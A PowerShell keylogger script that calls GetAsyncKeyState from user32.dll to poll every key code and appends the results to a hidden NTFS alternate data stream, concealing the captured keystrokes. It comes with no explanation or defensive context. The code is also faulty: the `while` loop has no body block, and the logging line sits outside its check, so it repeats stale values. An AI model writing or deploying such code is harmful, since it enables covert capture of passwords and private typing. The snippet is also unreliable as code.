$signature = @" 
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
"@ 
$state = Add-Type -MemberDefinition $signature -name "KeyType" -NameSpace NewKeyFunctions -PassThru

while($true)
#Run through each character in the keyboard
for($char=1; $char -le 254; $char++){
$log = $state::GetAsyncKeyState($char)
#If a key has been pressed
if($log -eq -32767){
$typed = $char
$line = "$typed"
}
Out-File -FilePath C:\Users\output.txt:logstream.txt -InputObject $line -Append 
}